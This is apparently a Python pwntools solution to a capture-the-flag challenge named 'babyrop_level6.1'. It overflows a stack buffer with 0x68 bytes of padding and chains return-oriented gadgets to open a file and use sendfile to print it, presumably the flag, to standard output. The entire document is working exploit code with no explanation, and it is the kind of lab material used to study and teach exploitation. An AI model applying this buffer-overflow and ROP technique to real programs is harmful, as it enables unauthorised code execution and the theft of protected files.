from pwn import *



p = process(["/challenge/babyrop_level6.1"])
buf = b"A" * (0x68)
context.arch = 'amd64'

elf = ELF('/challenge/babyrop_level6.1')

rop = ROP(elf)
pop_rdi = rop.rdi.address
pop_rsi = rop.rsi.address
pop_rdx = rop.rdx.address
pop_rcx = rop.rcx.address

rop.raw(pop_rdi)
rop.raw(0x40200D)
rop.raw(pop_rsi)
rop.raw(0)
rop.raw(0x401100) #read

rop.raw(pop_rdi)
rop.raw(1)
rop.raw(pop_rsi)
rop.raw(3)
rop.raw(pop_rdx)
rop.raw(0)
rop.raw(pop_rcx)
rop.raw(58)
rop.raw(0x4010E0) # sendfile

payload = buf + rop.chain()

p.send(payload)
print(p.recvall().decode())
p.close()